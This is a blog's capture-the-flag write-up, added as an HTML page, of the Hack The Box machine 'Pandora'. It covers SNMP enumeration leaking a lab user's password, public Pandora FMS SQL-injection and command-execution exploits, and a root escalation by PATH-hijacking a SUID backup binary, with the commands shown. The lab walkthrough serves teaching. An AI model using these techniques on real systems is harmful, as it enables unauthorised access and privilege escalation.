@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CentHack | Welcome to my blog!!</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="CentHack" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Welcome to my blog!!" />
+<meta property="og:description" content="Welcome to my blog!!" />
+<link rel="canonical" href="http://localhost:4000/pages/writeups/pandora.html" />
+<meta property="og:url" content="http://localhost:4000/pages/writeups/pandora.html" />
+<meta property="og:site_name" content="CentHack" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CentHack" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Welcome to my blog!!","headline":"CentHack","url":"http://localhost:4000/pages/writeups/pandora.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>CentHack</h1>
+        </a>
+        <h2>Welcome to my blog!!</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="pandora">Pandora</h1>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>IP → 10.10.11.136</p>
+
+<p>Port scan reported the following ports opened.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">REASON</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="n">syn</span><span class="o">-</span><span class="n">ack</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">syn</span><span class="o">-</span><span class="n">ack</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">REASON</span>  <span class="n">VERSION</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">OpenSSH</span> <span class="mf">8.2</span><span class="n">p1</span> <span class="n">Ubuntu</span> <span class="mi">4</span><span class="n">ubuntu0</span><span class="p">.</span><span class="mi">3</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
+<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span> 
+<span class="o">|</span>   <span class="mi">3072</span> <span class="mi">24</span><span class="p">:</span><span class="n">c2</span><span class="p">:</span><span class="mi">95</span><span class="p">:</span><span class="n">a5</span><span class="p">:</span><span class="n">c3</span><span class="p">:</span><span class="mi">0</span><span class="n">b</span><span class="p">:</span><span class="mi">3</span><span class="n">f</span><span class="p">:</span><span class="n">f3</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">3</span><span class="n">c</span><span class="p">:</span><span class="mi">68</span><span class="p">:</span><span class="n">d7</span><span class="p">:</span><span class="n">af</span><span class="p">:</span><span class="mi">2</span><span class="n">b</span><span class="p">:</span><span class="mi">53</span><span class="p">:</span><span class="mi">38</span> <span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
+<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">rsa</span> <span class="n">AAAAB3NzaC1yc2EAAAADAQABAAABgQDPIYGoHvNFwTTboYexVGcZzbSLJQsxKopZqrHVTeF8oEIu0iqn7E5czwVkxRO</span><span class="o">/</span><span class="n">icqaDqM</span><span class="o">+</span><span class="n">AB3QQVcZSDaz</span><span class="o">//</span><span class="n">XoXsT</span><span class="o">/</span><span class="n">NzNIbb9SERrcK</span><span class="o">/</span><span class="n">n8n9or4IbXBEtXhRvltS8NABsOTuhiNo</span><span class="o">/</span><span class="mi">2</span><span class="n">fdPYCVJ</span><span class="o">/</span><span class="n">HyF5YmbmtqUPols6F5y</span><span class="o">/</span><span class="n">MK2Yl3eLMOdQQeax4AWSKVAsR</span><span class="o">+</span><span class="n">issSZlN2rADIvpboV7YMoo3ktlHKz4hXlX6FWtfDN</span><span class="o">/</span><span class="n">ZyokDNNpgBbr7N8zJ87</span><span class="o">+</span><span class="n">QfmNuuGgmcZzxhnzJOzihBHIvdIM4oMm4IetfquYm1WKG3s5q70jMFrjp4wCyEVbxY</span><span class="o">+</span><span class="n">DcJ54xjqbaNHhVwiSWUZnAyWe4gQGziPdZH2ULY</span><span class="o">+</span><span class="n">n3iTze</span><span class="o">+</span><span class="mf">8E4</span><span class="n">a6rxN3l38d1r4THoru88G56QESiy</span><span class="o">/</span><span class="n">jQ8m5</span><span class="o">+</span><span class="n">Ang77rSEaT3Fnr6rnAF5VG1</span><span class="o">+</span><span class="n">kiA36rMIwLabnxQbAWnApRX9CHBpMdBj7v8oLhCRn7ZEoPDcD1P2AASdaDJjRMuR52YPDlUSDd8TnI</span><span class="o">/</span><span class="n">DFFs</span><span class="o">=</span>
+<span class="o">|</span>   <span class="mi">256</span> <span class="n">b1</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">77</span><span class="p">:</span><span class="mi">99</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">9</span><span class="n">a</span><span class="p">:</span><span class="mi">6</span><span class="n">c</span><span class="p">:</span><span class="mi">5</span><span class="n">d</span><span class="p">:</span><span class="n">d2</span><span class="p">:</span><span class="mi">98</span><span class="p">:</span><span class="mi">2</span><span class="n">f</span><span class="p">:</span><span class="n">c0</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">9</span><span class="n">a</span><span class="p">:</span><span class="n">ce</span><span class="p">:</span><span class="mi">03</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
+<span class="o">|</span> <span class="n">ecdsa</span><span class="o">-</span><span class="n">sha2</span><span class="o">-</span><span class="n">nistp256</span> <span class="n">AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNNJGh4HcK3rlrsvCbu0kASt7NLMvAUwB51UnianAKyr9H0UBYZnOkVZhIjDea3F</span><span class="o">/</span><span class="n">CxfOQeqLpanqso</span><span class="o">/</span><span class="n">EqXcT9w</span><span class="o">=</span>
+<span class="o">|</span>   <span class="mi">256</span> <span class="n">e7</span><span class="p">:</span><span class="mi">36</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">3</span><span class="n">b</span><span class="p">:</span><span class="n">a9</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">8</span><span class="n">a</span><span class="p">:</span><span class="mi">19</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="n">b2</span><span class="p">:</span><span class="n">bc</span><span class="p">:</span><span class="mi">89</span><span class="p">:</span><span class="n">f6</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">08</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_ssh</span><span class="o">-</span><span class="n">ed25519</span> <span class="n">AAAAC3NzaC1lZDI1NTE5AAAAIOCMYY9DMj</span><span class="o">/</span><span class="n">I</span><span class="o">+</span><span class="n">Rfosf</span><span class="o">+</span><span class="n">yMuevI7VFIeeQfZSxq67EGxsb</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.4</span><span class="p">.</span><span class="mi">41</span> <span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="p">.</span><span class="mi">41</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">favicon</span><span class="p">:</span> <span class="n">Unknown</span> <span class="n">favicon</span> <span class="n">MD5</span><span class="p">:</span> <span class="mf">115E49</span><span class="n">F9A03BB97DEB840A3FE185434C</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Play</span> <span class="o">|</span> <span class="n">Landing</span>
+<span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="n">methods</span><span class="p">:</span> 
+<span class="o">|</span><span class="n">_</span>  <span class="n">Supported</span> <span class="n">Methods</span><span class="p">:</span> <span class="n">GET</span> <span class="n">POST</span> <span class="n">OPTIONS</span> <span class="n">HEAD</span>
+<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span>
+</code></pre></div></div>
+
+<h3 id="port-80">Port 80</h3>
+
+<p>We first enumerate the web page using <code class="language-plaintext highlighter-rouge">whatweb</code> and <code class="language-plaintext highlighter-rouge">curl</code> .</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">machines</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">pandora</span><span class="p">]</span>
+<span class="err">└─$</span> <span class="n">whatweb</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.136</span>
+<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">11.136</span> <span class="p">[</span><span class="mi">200</span> <span class="n">OK</span><span class="p">]</span> <span class="n">Apache</span><span class="p">[</span><span class="mf">2.4</span><span class="p">.</span><span class="mi">41</span><span class="p">],</span> <span class="n">Bootstrap</span><span class="p">,</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">Email</span><span class="p">[</span><span class="n">contact</span><span class="nd">@panda.htb</span><span class="p">,</span><span class="n">example</span><span class="nd">@yourmail.com</span><span class="p">,</span><span class="n">support</span><span class="nd">@panda.htb</span><span class="p">],</span> <span class="n">HTML5</span><span class="p">,</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">][</span><span class="n">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="p">.</span><span class="mi">41</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">11.136</span><span class="p">],</span> <span class="n">Open</span><span class="o">-</span><span class="n">Graph</span><span class="o">-</span><span class="n">Protocol</span><span class="p">[</span><span class="n">website</span><span class="p">],</span> <span class="n">Script</span><span class="p">,</span> <span class="n">Title</span><span class="p">[</span><span class="n">Play</span> <span class="o">|</span> <span class="n">Landing</span><span class="p">],</span> <span class="n">probably</span> <span class="n">WordPress</span><span class="p">,</span> <span class="n">X</span><span class="o">-</span><span class="n">UA</span><span class="o">-</span><span class="n">Compatible</span><span class="p">[</span><span class="n">IE</span><span class="o">=</span><span class="n">edge</span><span class="p">]</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">machines</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">pandora</span><span class="p">]</span>
+<span class="err">└─$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">I</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.136</span>                         
+<span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="n">OK</span>
+<span class="n">Date</span><span class="p">:</span> <span class="n">Mon</span><span class="p">,</span> <span class="mi">20</span> <span class="n">Nov</span> <span class="mi">2023</span> <span class="mi">05</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">21</span> <span class="n">GMT</span>
+<span class="n">Server</span><span class="p">:</span> <span class="n">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="p">.</span><span class="mi">41</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+<span class="n">Last</span><span class="o">-</span><span class="n">Modified</span><span class="p">:</span> <span class="n">Fri</span><span class="p">,</span> <span class="mi">03</span> <span class="n">Dec</span> <span class="mi">2021</span> <span class="mi">14</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">31</span> <span class="n">GMT</span>
+<span class="n">ETag</span><span class="p">:</span> <span class="sh">"</span><span class="s">8318-5d23e548bc656</span><span class="sh">"</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Ranges</span><span class="p">:</span> <span class="nb">bytes</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">33560</span>
+<span class="n">Vary</span><span class="p">:</span> <span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span>
+</code></pre></div></div>
+
+<p>We have obtained a domain name  → <code class="language-plaintext highlighter-rouge">panda.htb</code> .</p>
+
+<p>It seems like the this is a wordpress instance, but we don’t see any typical wordpress route in the source code.</p>
+
+<p>The page use <code class="language-plaintext highlighter-rouge">PHP</code>.</p>
+
+<ul>
+  <li>Directory and file enumeration → nothing found</li>
+  <li>Subdomain enumeration → nothing found</li>
+</ul>
+
+<p>It seems we will have to look for something in the UDP ports.</p>
+
+<h1 id="foothold">Foothold</h1>
+
+<p>Port scan in UDP realm reported SNMP service active.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PORT</span>    <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">REASON</span>
+<span class="mi">161</span><span class="o">/</span><span class="n">udp</span> <span class="nb">open</span>  <span class="n">snmp</span>    <span class="n">udp</span><span class="o">-</span><span class="n">response</span> <span class="n">ttl</span> <span class="mi">63</span>
+</code></pre></div></div>
+
+<p>Let’s enumerate SNMP service.</p>
+
+<ul>
+  <li>NMAP scripts</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">|</span>   <span class="mi">837</span><span class="p">:</span> 
+<span class="o">|</span>     <span class="n">Name</span><span class="p">:</span> <span class="n">sh</span>
+<span class="o">|</span>     <span class="n">Path</span><span class="p">:</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span>
+<span class="o">|</span>     <span class="n">Params</span><span class="p">:</span> <span class="o">-</span><span class="n">c</span> <span class="n">sleep</span> <span class="mi">30</span><span class="p">;</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span> <span class="o">-</span><span class="n">c</span> <span class="sh">'</span><span class="s">/usr/bin/host_check -u daniel -p HotelBabylon23</span><span class="sh">'</span>
+</code></pre></div></div>
+
+<p>In nmap we found what seems to be credentials for a user → <code class="language-plaintext highlighter-rouge">daniel:HotelBabylon23</code> .</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">daniel</span><span class="nd">@pandora</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">whoami</span>
+<span class="n">daniel</span>
+<span class="n">daniel</span><span class="nd">@pandora</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+</code></pre></div></div>
+
+<p>We can use them to SSH into the machine.</p>
+
+<h1 id="privilege-escalation">Privilege escalation</h1>
+
+<p>Basic enumeration didn’t show nothing, but we find that the user <strong>matt</strong> is running a service in <code class="language-plaintext highlighter-rouge">pandora.panda.htb</code> , so if we can execute commands from that service we execute commands as matt.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">daniel</span><span class="nd">@pandora</span><span class="p">:</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">sites</span><span class="o">-</span><span class="n">enabled</span><span class="err">$</span> <span class="n">cat</span> <span class="n">pandora</span><span class="p">.</span><span class="n">conf</span> 
+<span class="o">&lt;</span><span class="n">VirtualHost</span> <span class="n">localhost</span><span class="p">:</span><span class="mi">80</span><span class="o">&gt;</span>
+  <span class="n">ServerAdmin</span> <span class="n">admin</span><span class="nd">@panda.htb</span>
+  <span class="n">ServerName</span> <span class="n">pandora</span><span class="p">.</span><span class="n">panda</span><span class="p">.</span><span class="n">htb</span>
+  <span class="n">DocumentRoot</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">pandora</span>
+  <span class="n">AssignUserID</span> <span class="n">matt</span> <span class="n">matt</span>
+  <span class="o">&lt;</span><span class="n">Directory</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">pandora</span><span class="o">&gt;</span>
+    <span class="n">AllowOverride</span> <span class="n">All</span>
+  <span class="o">&lt;/</span><span class="n">Directory</span><span class="o">&gt;</span>
+  <span class="n">ErrorLog</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">error</span><span class="p">.</span><span class="n">log</span>
+  <span class="n">CustomLog</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">access</span><span class="p">.</span><span class="n">log</span> <span class="n">combined</span>
+<span class="o">&lt;/</span><span class="n">VirtualHost</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>It is running only in localhost, so we need to make that internal port visible to our attacking machine. I’ve used <code class="language-plaintext highlighter-rouge">chisel</code> for this. Accessing the web we cna see that is a CMS called pandora CMS and the version is leaked:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">v7.0NG.742_FIX_PERL2020</code></li>
+</ul>
+
+<p>There two exploits we want to use to exploit this service:</p>
+
+<ul>
+  <li>Auth bypass → https://github.com/l3eol3eo/CVE-2021-32099_SQLi</li>
+  <li>Command execution → https://github.com/UNICORDev/exploit-CVE-2020-5844</li>
+</ul>
+
+<p>Using this two exploits we are able to execute commands as user <code class="language-plaintext highlighter-rouge">matt</code>, who is the user running the service. Once we have a shell we can upgrade th reverse shell to a interactive tty o we can add out public we to the authorized keys of user matt and get a SSH shell which is more comfortable.</p>
+
+<p>For the escalation itself listing SUID binaries we can see that there is an awkard one.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span>   <span class="mi">1</span> <span class="n">root</span>     <span class="n">matt</span>        <span class="mi">16816</span> <span class="n">Dec</span>  <span class="mi">3</span>  <span class="mi">2021</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">pandora_backup</span>
+</code></pre></div></div>
+
+<p>If execute this we won’t get much information, although is clear that is making a backup of the <code class="language-plaintext highlighter-rouge">/var/www/pandora/</code> directory. To know exactly what command is being executed we can use pspy in another shell and execute the binary again. The result is the following command:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">2023</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">20</span> <span class="mi">18</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">27</span> <span class="n">CMD</span><span class="p">:</span> <span class="n">UID</span><span class="o">=</span><span class="mi">0</span>     <span class="n">PID</span><span class="o">=</span><span class="mi">4781</span>   <span class="o">|</span> <span class="n">sh</span> <span class="o">-</span><span class="n">c</span> <span class="n">tar</span> <span class="o">-</span><span class="n">cvf</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">backup</span><span class="o">/</span><span class="n">pandora</span><span class="o">-</span><span class="n">backup</span><span class="p">.</span><span class="n">tar</span><span class="p">.</span><span class="n">gz</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">pandora</span><span class="o">/</span><span class="n">pandora_console</span><span class="o">/*</span> 
+<span class="mi">2023</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">20</span> <span class="mi">18</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">27</span> <span class="n">CMD</span><span class="p">:</span> <span class="n">UID</span><span class="o">=</span><span class="mi">0</span>     <span class="n">PID</span><span class="o">=</span><span class="mi">4780</span>   <span class="o">|</span> <span class="n">sh</span> <span class="o">-</span><span class="n">c</span> <span class="n">tar</span> <span class="o">-</span><span class="n">cvf</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">backup</span><span class="o">/</span><span class="n">pandora</span><span class="o">-</span><span class="n">backup</span><span class="p">.</span><span class="n">tar</span><span class="p">.</span><span class="n">gz</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">pandora</span><span class="o">/</span><span class="n">pandora_console</span><span class="o">/*</span>
+</code></pre></div></div>
+
+<p>Altought it may seem like we can abuse the typical tar wildcard abuse that’s not the case, we can try but won’t work since there is a source directory specify. Instead, we can se that tar is not an absolute path but a relative one, so we can exploit this with a <code class="language-plaintext highlighter-rouge">PATH hijacking</code> to get a shell as root.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">matt</span><span class="nd">@pandora</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">echo</span> <span class="sh">'</span><span class="s">#!/bin/bash</span><span class="sh">'</span> <span class="o">&gt;&gt;</span> <span class="n">tar</span>
+<span class="n">matt</span><span class="nd">@pandora</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">echo</span> <span class="sh">'</span><span class="s">bash</span><span class="sh">'</span> <span class="o">&gt;&gt;</span> <span class="n">tar</span>
+<span class="n">matt</span><span class="nd">@pandora</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="n">tar</span> 
+<span class="n">matt</span><span class="nd">@pandora</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">export</span> <span class="n">PATH</span><span class="o">=</span><span class="p">.:</span><span class="err">$</span><span class="n">PATH</span>
+<span class="n">matt</span><span class="nd">@pandora</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">pandora_backup</span> 
+<span class="n">PandoraFMS</span> <span class="n">Backup</span> <span class="n">Utility</span>
+<span class="n">Now</span> <span class="n">attempting</span> <span class="n">to</span> <span class="n">backup</span> <span class="n">PandoraFMS</span> <span class="n">client</span>
+<span class="n">root</span><span class="nd">@pandora</span><span class="p">:</span><span class="o">~</span><span class="c1"># id
+</span><span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">matt</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">matt</span><span class="p">)</span>
+<span class="n">root</span><span class="nd">@pandora</span><span class="p">:</span><span class="o">~</span><span class="c1"># whoami
+</span><span class="n">root</span>
+</code></pre></div></div>
+
+      </section>
+    </div>
+  </body>
+</html>
